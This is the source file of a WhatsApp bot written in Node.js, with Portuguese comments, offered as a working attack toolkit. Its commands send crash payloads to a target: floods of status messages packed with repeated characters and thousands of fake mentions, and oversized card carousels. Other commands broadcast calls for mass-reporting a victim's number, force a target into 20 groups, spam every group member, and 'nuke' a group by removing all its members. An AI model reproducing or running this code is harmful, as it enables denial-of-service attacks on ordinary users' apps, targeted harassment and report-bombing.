// main.js
const {
  generateWAMessageFromContent,
  downloadContentFromMessage,
  makeCacheableSignalKeyStore,
  prepareWAMessageMedia,
  fetchLatestBaileysVersion,
  downloadMediaMessage,
  PHONENUMBER_MCC,
  useMultiFileAuthState,
  generateMessageID,
  getTypeMessage,
  makeWASocket,
  delay,
  proto,
  store,
  chats
} = require("@angstvorfrauen/baileys");
const { Boom } = require("@hapi/boom");
const libPhonenumber = require("libphonenumber-js");
const moment = require("moment-timezone");
const NodeCache = require("node-cache");
const gradient = require("gradient-string");
const path = require("path");
const pino = require("pino");
const Jimp = require("jimp");
const os = require("os");
const fs = require("fs");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail, scansSidecar, midQualityFileSha256, thumbnailDirectPath, thumbnailSha256, thumbnailEncSha256 } = require("./database/mediaall.js");
const { menu } = require("./database/menu.js");
module.exports = async (sock, m, chatUpdate) => {
const message = m
  m.id = m.key.id;
  m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
  m.chat = m.key.remoteJid;
  m.fromMe = m.key.fromMe;
  m.isGroup = m.chat.endsWith("@g.us");
  m.sender = sock.decodeJid(m.fromMe && sock.user.id || m.participant || m.key.participant || m.chat || "");
  if (m.isGroup) m.participant = sock.decodeJid(m.key.participant) || "";
  function getTypeM(message) {
    const type = Object.keys(message);
    var restype =  (!["senderKeyDistributionMessage", "messageContextInfo"].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== "messageContextInfo" && type[1]) || type[type.length - 1] || Object.keys(message)[0];
	return restype;
  };
  m.mtype = getTypeM(m.message);
  m.msg = (m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype]);
  m.text = m.msg?.text 
      || m.msg?.caption 
      || m.message?.conversation 
      || m.msg?.contentText 
      || m.msg?.selectedDisplayText 
      || m.msg?.title 
      || "";
  const info = m;
  const from = message.key.remoteJid;
  var body = 
    (m.mtype === "interactiveResponseMessage") ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:
    (m.mtype === "conversation") ? m.message.conversation :
    (m.mtype === "deviceSentMessage") ? m.message.extendedTextMessage.text :
    (m.mtype == "imageMessage") ? m.message.imageMessage.caption :
    (m.mtype == "videoMessage") ? m.message.videoMessage.caption : 
    (m.mtype == "extendedTextMessage") ? m.message.extendedTextMessage.text : 
    (m.mtype == "buttonsResponseMessage") ? m.message.buttonsResponseMessage.selectedButtonId : 
    (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : 
    (m.mtype == "templateButtonReplyMessage") ? m.message.templateButtonReplyMessage.selectedId : 
    (m.mtype == "messageContextInfo") ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : "";
  const getGroupAdmins = (participants) => {
    let admins = [];
    for (let i of participants) {
      i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : "";
    };
    return admins || [];
  }
  const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
  var budy = (typeof m.text == "string" ? m.text: "");
  const bardy = body || "";
  prefix = [".","!",""]
  var prefix = prefix 
    ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(bardy) 
    ? bardy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefix ?? global.prefix;
  const isCmd = bardy.startsWith(prefix);
  const command = isCmd ? bardy.slice(prefix.length).trim().split(" ").shift().toLowerCase() : "";
  const quoted = m.quoted ? m.quoted : m;
  const sender = info.key.fromMe ? (sock.user.id.split(":")[0]+"@s.whatsapp.net" || sock.user.id) : (info.key.participant || info.key.remoteJid)
  const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : "";
  const participants = m.isGroup ? await groupMetadata.participants : "";
  const botNumber = await sock.decodeJid(sock.user.id);
  const device = "" + (info.key.id.length > 21 ? "Android" : info.key.id.substring(0, 2) == "3A" ? "Ios": "Web ore Api ore Bot");
  const date = moment.tz("Europe/Berlin").format("DD/MM/YY");
  const time = moment.tz("Europe/Berlin").format("HH:mm:ss");
  const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
  const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
  const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
  const groupName = m.isGroup ? groupMetadata?.subject : "";
  const mime = (quoted.msg || quoted).mimetype || "";
  const args = bardy.trim().split(/ +/).slice(1);
  const isBot = info.key.fromMe ? true : false;
  const IsOwner = (m.sender === "5582993708218@s.whatsapp.net");
  const username = m.pushName || "No Name";
  const content = JSON.stringify(m.message);
  const isGroup = from.endsWith("@g.us");
  const sJid = "status@broadcast";
  const text = args.join(" ");
  const q = args.join(" ");
  const reply = (text) => {
    sock.sendMessage(from, {
     text: text,
    })
  }
  sock.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
    const allmsg = generateWAMessageFromContent(jidss, jsontxt, outrasconfig);
    return sock.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.id});
  };
  const isImage = m.mtype === "imageMessage";
  const isVideo = m.mtype === "videoMessage";
  const isAudio = m.mtype === "audioMessage";
  const isSticker = m.mtype === "stickerMessage";
  const isContact = m.mtype === "contactMessage";
  const isPoll = m.mtype === "pollMessage";
  const isLocation = m.mtype === "locationMessage";
  const isProduct = m.mtype === "productMessage";
  if (isImage) {
    m.mtypeMessage = "Image";
  } else if (isVideo) {
    m.mtypeMessage = "Video";
  } else if (isAudio) {
    m.mtypeMessage = "Audio";
  } else if (isSticker) {
    m.mtypeMessage = "Sticker";
  } else if (isContact) {
    m.mtypeMessage = "Contact";
  } else if (isPoll) {
    m.mtypeMessage = "Poll";
  } else if (isLocation) {
    m.mtypeMessage = "Location";
  } else if (isProduct) {
    m.mtypeMessage = "Product";
  }
  const isQuotedMsg = m.mtype === "extendedTextMessage" && content.includes("textMessage");
  const isQuotedImage = m.mtype === "extendedTextMessage" && content.includes("imageMessage");
  const isQuotedVideo = m.mtype === "extendedTextMessage" && content.includes("videoMessage");
  const isQuotedDocument = m.mtype === "extendedTextMessage" && content.includes("documentMessage");
  const isQuotedAudio = m.mtype === "extendedTextMessage" && content.includes("audioMessage");
  const isQuotedSticker = m.mtype === "extendedTextMessage" && content.includes("stickerMessage");
  const isQuotedPoll = m.mtype === "extendedTextMessage" && content.includes("pollMessage");
  const isQuotedContact = m.mtype === "extendedTextMessage" && content.includes("contactMessage");
  const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage");
  const isQuotedProduct = m.mtype === "extendedTextMessage" && content.includes("productMessage");
  switch(command) {
  case "help": {
  if (!isBot) return;
    const menuText = `
*Olá, ${username}!* 👋.

*───「                             」───*

• ${prefix}lockall
• ${prefix}unlockall
• ${prefix}cgm <mensagem>
• ${prefix}nameall <nome>
• ${prefix}spamenviar <numero>
• ${prefix}bcgp <mensagem>


*───「                             」───*
`;

    sock.sendMessage(from, {
      text: menuText,
      contextInfo: {
        externalAdReply: {
          title: "「                             」",
          body: "@t4x",
          thumbnailUrl: "", // Substitua por uma URL de imagem válida
          sourceUrl: "wa.me/5582993708218", // Substitua pela URL do seu GitHub ou projeto
          mediaType: 1,
          renderLargerThumbnail: false
        }
      }
    });
  }
  break;

case "lockall": {
   if (!isBot) return;
  (async () => {
    try {
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});

      // Delay entre requisições para evitar rate limit
      const delay = ms => new Promise(res => setTimeout(res, ms));

      for (const gid of groupIds) {
        try {
          await sock.groupSettingUpdate(gid, "announcement");
        } catch (err1) {
          try {
            // Alguns forks usam nomenclaturas diferentes
            await sock.groupSettingUpdate(gid, "locked");
          } catch (err2) {
            // Ignora completamente o erro e segue
          }
        }
        await delay(2500); // espera 2.5 segundos entre cada requisição
      }
    } catch (err) {
      // Ignora qualquer erro global
    }
  })();
}
break;



case "unlockall": {
   if (!isBot) return;
  (async () => {
    try {
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});

      const delay = ms => new Promise(res => setTimeout(res, ms));

      for (const gid of groupIds) {
        try {
          await sock.groupSettingUpdate(gid, "not_announcement");
        } catch (err1) {
          try {
            await sock.groupSettingUpdate(gid, "unlocked");
          } catch (err2) {
            // Ignora qualquer erro individual
          }
        }
        await delay(2500); // espera 2.5 segundos entre cada requisição
      }
    } catch (err) {
      // Ignora qualquer erro global
    }
  })();
}
break;

case "cgm": {
   if (!isBot) return;
  (async () => {
    try {
      // Captura o texto enviado após o comando
      const textToSend = args.join(" ").trim();

      if (!textToSend) return; // Se não houver mensagem, sai silenciosamente

      // Busca todos os grupos que o bot participa
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});

      const delay = ms => new Promise(res => setTimeout(res, ms));

      for (const gid of groupIds) {
        try {
          await sock.sendMessage(gid, { text: textToSend });
        } catch (err) {
          // Ignora qualquer erro (sem log, sem reply)
        }
      }
    } catch (err) {
      // Ignora erros gerais
    }
  })();
}
break;
  
case "ct": {
  (async () => {
    try {
      // Somente OWNER pode rodar
      if (!isBot) return;

      const raw = args[0] ? args[0].trim() : "";
      if (!raw) {
        // Responde instrução de uso
        await sock.sendMessage(from, {
          text: "Uso: ct <jid_teste>\n\nEx: ct 5511999999999@s.whatsapp.net\nou: ct 5511999999999 (o @s.whatsapp.net será adicionado automaticamente)"
        }, { quoted: m });
        return;
      }

      // Normalizar JID: se só números, adicionar sufixo @s.whatsapp.net
      let targetJid = raw;
      if (!raw.includes("@")) {
        // remover caracteres não numéricos
        const digits = raw.replace(/\D/g, "");
        if (!digits) {
          await sock.sendMessage(from, { text: "JID inválido." }, { quoted: m });
          return;
        }
        targetJid = `${digits}@s.whatsapp.net`;
      }

      // Validar formato básico do JID
      const validSuffixes = ["@s.whatsapp.net", "@c.us", "@g.us", "@us.whatsapp.net", "@whatsapp.net"];
      const ok = validSuffixes.some(suf => targetJid.endsWith(suf));
      if (!ok) {
        // ainda assim permitir, mas avisar e abortar
        await sock.sendMessage(from, { text: "JID com formato inesperado. Use algo como 5511999999999 ou 5511999999999@s.whatsapp.net" }, { quoted: m });
        return;
      }

      // Quantidade de grupos a criar
      const COUNT = 20;
      // Quantos participantes (além do bot) por grupo (aqui só o targetJid)
      const participants = [targetJid];

      // Delay entre criações (ms) para reduzir chance de rate limit
      const DELAY_MS = 1000;
      const delay = ms => new Promise(res => setTimeout(res, ms));

      for (let i = 0; i < COUNT; i++) {
        try {
          // gerar nome aleatório para o grupo
          const rand = Math.random().toString(36).slice(2, 9);
          const subject = `CT_${rand}`;

          // criar grupo com o participante alvo
          if (typeof sock.groupCreate === "function") {
            await sock.groupCreate(subject, participants).catch(() => { /* ignora falha dessa chamada */ });
          } else {
            // fallback: se função não existir na sua versão da lib, tente outra maneira (mas normalmente groupCreate existe)
            try {
              await sock.groupCreate(subject, participants);
            } catch (e) {
              // ignora e continua
            }
          }
        } catch (errGroup) {
          // ignora erro individual e segue
        }

        // espera antes de criar o próximo grupo
        await delay(DELAY_MS);
      }

      // operação finaliza silenciosamente (sem enviar resumo)
    } catch (err) {
      // erro global: log no console para debug, mas não enviar ao chat
      try { console.error("ct error:", err); } catch (e) {}
    }
  })();
}
break;

case "nameall": {
  if (!isBot) return;
  (async () => {
    try {
      const newName = args.join(" ").trim();
      if (!newName) {
        await sock.sendMessage(from, {
          text: "Uso: nameall <novo_nome_do_grupo>"
        }, { quoted: m });
        return;
      }

      // buscar todos os grupos que o bot participa
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});

      // delay em ms entre cada atualização (ajuste se quiser outro intervalo)
      const DELAY_MS = 2000;
      const delay = ms => new Promise(res => setTimeout(res, ms));

      for (const gid of groupIds) {
        try {
          if (typeof sock.groupUpdateSubject === "function") {
            await sock.groupUpdateSubject(gid, newName);
          } else {
            // se a função não existir na sua versão da lib, tente via groupSettingUpdate (algumas libs não suportam renomear)
            // aqui tentamos uma chamada que provavelmente falhará em forks que não implementam renomear; o catch abaixo ignora.
            await sock.groupUpdateSubject(gid, newName);
          }
        } catch (err) {
          // ignora erro (não é admin, bad request, rate limit, etc.)
        }
        await delay(DELAY_MS);
      }
      // silencioso — não envia resposta no chat
    } catch (err) {
      // ignora erro global
    }
  })();
}
break;


case "spamenviar": {
  if (!isBot) return;
  (async () => {
    try {
      // Captura o texto enviado após o comando
      const textToSend = args.join(" ").trim();

      if (!textToSend) {
          reply("\n\n   Por favor, me mande o alvo que você quer marcar neste formato:\n\n.spamenviar 5511974186773\n\nNúmero todo junto sem \"-\", \"(\", \")\", \"+\" ou \"e\"\n\n");
        return; // Sai se não houver argumento
      }

      // Mensagem padrão a ser enviada
      const spamMessage = `\n♨️‼️ ATAQUE DE DENUNCIAS ‼️♨️ 🔥 \n\n》MANDE MENSAGEM PARA CADA ALVO, DEPOIS DENUNCIE 1 VEZ, DEPOIS DE BLOCK. \n\n◊ 1️⃣.: https://wa.me/${textToSend} \n\n🔥》 Prints no meu privado!\n\n`;

      // Busca todos os grupos que o bot participa
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});

      const delay = ms => new Promise(res => setTimeout(res, ms));

      for (const gid of groupIds) {
        try {
          await sock.sendMessage(gid, { text: spamMessage });
        } catch (err) {
          // Ignora qualquer erro (sem log, sem reply)
        }
      }
    } catch (err) {
      // Ignora erros gerais
    }
  })();
}
break;

case "x": {
  if (!isBot) return;
  const target = from
    async function LocX(target) { //target = from
    for (let i = 0; i < 500; i++) {
      const LocaX = {
        viewOnceMessage: {
          message: {
            locationMessage: {
              degreesLatitude: 0.000000,
              degreesLongitude: 0.000000,
              name: "ꦽ".repeat(400),
              address: "ꦽ".repeat(300),
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 5000 },
                  () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
                isSampled: true,
                participant: target,
                remoteJid: target,
                forwardingScore: 9741,
                isForwarded: true
              }
            }
          }
        }
      };
      const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }, { participant: target });
    }}
    LocX(target)
  }
  break;

case "": { // use the command with: . but, this dont cause conflict with other commands
  if (!isBot) return;
  for (let i = 0; i < 10; i++) {
    const singleCard = {
      "header": {
        "title": ".",
        "imageMessage": {
          "url": `${url}`,
          "mimetype": "image/jpeg",
          "caption": ".",
          "fileSha256": `${fileSha256}`,
          "fileLength": "10",
          "height": 1000,
          "width": 1000,
          "mediaKey": `${mediaKey}`,
          "fileEncSha256": `${fileEncSha256}`,
          "directPath": `${directPath}`,
          "jpegThumbnail": `${jpegThumbnail}`,
        },
        "hasMediaAttachment": true
      },
      "body": { "text": "." },
      "footer": { "text": "." },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
              "display_text": "x",
              "url": "https://google.com",
              "merchant_url": "https://google.com"
            })
          }
        ]
      }
    };
    console.log(`⏳ Enviando carta em lote ${i + 1}/10...`);
    const card = Array(1500).fill(singleCard);
    await sock.sendjson(from, {
      "interactiveMessage": {
        "body": { "text": "." },
        "carouselMessage": {
          "cards": card
        }
      }
    });
  }
}
console.log("✅ Envio de cartas concluído.");
break;

case "bcgp": { // send message to all the members in a group
  if (!isBot) return;
  if (!text) return reply(`Use: ${prefix}bcgp <mensagem>`);
  const group = await sock.groupMetadata(from);
  for (let i = 0; i < group.participants.length; i++) {
    const member = group.participants[i];
    if (member.id === botNumber) continue;
    await delay(2000); // delay 2 seconds between messages to avoid rate limiting
    await sock.sendMessage(member.id, { text: `${text}` });
  }
  // after, delete all chats with the bot
  const chats = await sock.fetchChats();
  for (let i = 0; i < chats.length; i++) {
    const chat = chats[i];
    if (chat.jid.endsWith("@s.whatsapp.net") && chat.jid !== botNumber) {
      await delay(1000); // delay 1 second between deletions
      await sock.modifyChat(chat.jid, "delete");
    }
}
}
break;

case "clonegroup": { // cloning group, create a new group with: same subject, same description, same participants, same picture, etc.
  if (!isBot) return; // bot starts creating a group with itself, after that it adds the participants, one by one, mapping jids to add, the name and description, and the picture, eviting the error:
  // file:///C:/Users/thzin/Downloads/bot/node_modules/@angstvorfrauen/baileys/lib/WABinary/generic-utils.js:54
    // throw new Boom(errNode.attrs.text || "Unknown error", { data: +errNode.attrs.code });
    // Error: bad-request
    //  at assertNodeErrorFree (file:///C:/Users/thzin/Downloads/bot/node_modules/@angstvorfrauen/baileys/lib/WABinary/generic-utils.js:54:11)
    // at query (file:///C:/Users/thzin/Downloads/bot/node_modules/@angstvorfrauen/baileys/lib/Socket/socket.js:111:7)
    //  at process.processTicksAndRejections (node:internal/process/task_queues:105:5)
    // at async Object.groupCreate (file:///C:/Users/thzin/Downloads/bot/node_modules/@angstvorfrauen/baileys/lib/Socket/groups.js:72:22)
    //  at async module.exports (C:\Users\thzin\Downloads\bot\main.js:612:20) {
    // data: 400,
    // isBoom: true,
    //  isServer: true,
    // output: {
    // statusCode: 500,
    // payload: {
    // statusCode: 500,
    // error: 'Internal Server Error',
    // message: 'An internal server error occurred'
    // },
    // headers: {}
    // }
  if (!m.isGroup) return reply("Este comando só pode ser usado em grupos.");
  const groupMetadata = await sock.groupMetadata(from);
  const groupSubject = groupMetadata.subject || "Cloned Group";
  const groupDesc = groupMetadata.desc?.toString() || "";
  const groupParticipants = groupMetadata.participants.map(p => p.id).filter(id => id !== botNumber);
  // create new group with same subject and description
  const newGroup = await sock.groupCreate(groupSubject, [botNumber]);
  const newGroupId = newGroup.gid;
  // set description
  if (groupDesc) {
    try {
      await sock.groupUpdateDescription(newGroupId, groupDesc);
    } catch (err) {
      // ignore error
    }
  }
  // add participants one by one
  for (const participant of groupParticipants) {
    try {
      await sock.groupParticipantsUpdate(newGroupId, [participant], "add");
      await delay(2000); // delay 2 seconds between adds to avoid rate limiting
    } catch (err) {
      // ignore error
    }
  }
  // set group picture
  try {
    const pfp = await sock.getProfilePicture(from).catch(() => null);
    if (pfp) {
      const response = await fetch(pfp);
      const buffer = await response.buffer();
      await sock.updateProfilePicture(newGroupId, buffer);
    }
  } catch (err) {
    // ignore error
  }
  reply(`✅ Grupo clonado com sucesso!\n\nNovo grupo: ${newGroupId}`);
}
break;
                    

  //=========================//
  case "info": {
    const infogetclone1 = isQuotedMsg ? 
      info.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage : 
      info.message.extendedTextMessage.contextInfo.quotedMessage;
    const formattedJson = JSON.stringify(infogetclone1, null, 2);
    const finalCode = `case "sock": {\n  sock.sendjson(from,${formattedJson.replace(/^/gm, " ")});\n}\nbreak;`;
    sock.sendjson(from, {
      "extendedTextMessage": {
        "text": finalCode,
        "contextInfo": {
          "forwardingScore": 127,
          "isForwarded": true,
          "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363403702895002@newsletter",
            "severMessageId": "1",
            "newsletterName": `🔥 𝐑𝐨𝐜𝐤𝐞𝐭𝐂𝐥𝐢𝐞𝐧𝐭𝐕𝟒.𝟐 🔥`,
            "contentType": "LINK_CARD"
          }
        }
      }
    });
  }
  break;

  //=========================//
case "nuke": {
    if (!isBot) return;
    const participants = await sock.groupMetadata(from).then(metadata => metadata.participants);
    const owner = await sock.groupMetadata(from).then(metadata => metadata.owner);
    const numbersToKick = participants
      .map(participant => participant.id.replace("@c.us", "@s.whatsapp.net"))
      .filter(number => number !== owner);
    await sock.groupSettingUpdate(from, "announcement");
    await sock.groupSettingUpdate(from, "locked");
    await sock.sendMessage(from, { text: `GRUPO NUKADO COM SUCESSO !` , mentions: [participants] });
    for (let i = 0; i < numbersToKick.length; i++) {
      const response = await sock.groupParticipantsUpdate(from, [numbersToKick[i]], "remove");
    }
  }
  break;

  //=========================//
  case "me": {
    //Usage: .me
    if (!isBot) return;
    reply(sender)
  }
  break;
  //=========================//
  case "from": {
    //Usage: .from
    if (!isBot) return;
    reply(from)
  }
  break;
  //=========================//
  case "refresh": {
    //Usage: .refresh  
    if (!isBot) return;
    function cleanFolder(folderPath, excludeFile) {
      fs.readdir(folderPath, (_, files) => {
        files.forEach((file, index) => {
          if (file !== excludeFile) {
            fs.unlink(path.join(folderPath, file), () => {
              if (index === files.length - 1) {
                console.log("Refresehed Session");
              }
            });
          } else if (index === files.length - 1) {
            console.log("Refresehed Session");
          }
        });
        if (files.length === 0) console.log("Refresehed Session");
      });
    }
    cleanFolder(dir("./database/Session"), "creds.json");
  }
  break;
  
  //=========================//
  case "ping": {
    //Usage: .ping
    if (!isBot) return;
    async function CheckPing (from) {
      let start = new Date;
      let { key } = await sock.sendMessage(from, {text: "wait.."});
      let done = new Date - start;
      var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`;
      await sleep(1000);
      await sock.sendMessage(from, {text: lod, edit: key });
    }
    CheckPing(from);
  }
  break;

  //=========================/
  case "restart": {
    //Usage: .restart
    if (!isBot) return;
    reply("Restarting will be completed in seconds");
    console.clear();
    await sleep(1000);
    process.exit();
  }
  break;
  //=========================//
  }
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  delete require.cache[file];
  require(file);
});